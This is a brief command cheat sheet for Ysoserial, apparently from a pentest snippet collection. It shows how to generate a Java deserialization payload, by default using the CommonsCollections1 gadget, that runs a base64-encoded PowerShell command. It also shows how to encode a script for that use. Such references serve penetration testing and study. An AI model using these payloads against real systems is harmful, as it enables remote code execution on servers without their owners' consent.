# Ysoserial

## java

### PowerShell payload

Spawn PowerShell payload with Ysoserial.

```sh title:"Ysoserial Spawn PowerShell Payload"
java -jar ysoserial.jar "$gadget" "powershell.exe -EncodedCommand $base64_encoded_command" > "$output_file"
```
<!-- cheat
var gadget := CommonsCollections1
var base64_encoded_command
var output_file
-->

### PowerShell encode file

Encode PowerShell encode file with Ysoserial.

```sh title:"Ysoserial Encode PowerShell Encode File"
iconv -f ASCII -t UTF-16LE "$script_file" | base64 | tr -d "\n"
```
<!-- cheat
var script_file
-->
